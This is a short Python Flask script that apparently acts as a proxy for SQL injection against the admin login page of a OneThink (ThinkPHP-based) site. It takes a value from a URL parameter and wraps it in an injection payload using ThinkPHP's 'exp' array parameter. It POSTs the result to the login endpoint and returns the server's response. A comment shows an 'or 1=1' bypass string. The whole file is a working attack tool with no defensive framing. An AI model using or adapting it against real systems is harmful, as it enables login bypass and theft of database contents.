# encoding: utf-8
# sqli-reverse-flask.py

from flask import Flask,request,jsonify
import requests


def remote_login(payload):
    '''
    对服务器发起访问请求
    '''
    burp0_url = "http://one.think:80/index.php?s=/admin/public/login.html"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
    # )) or 1=1 -- -
    pay = ") =' {} ')-- -".format(payload) # )={payload} ）1 = 1
    print(pay)
    burp0_data = {"act": "verify", "username[0]": 'exp', "username[1]": pay, "password": "", "verify": ""}
    resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)

    return resp.text

app = Flask(__name__)
@app.route('/')
def login():
    payload =  request.args.get("id")
    print(payload)
    response = remote_login(payload)
    return response

if __name__ == '__main__':
    app.run()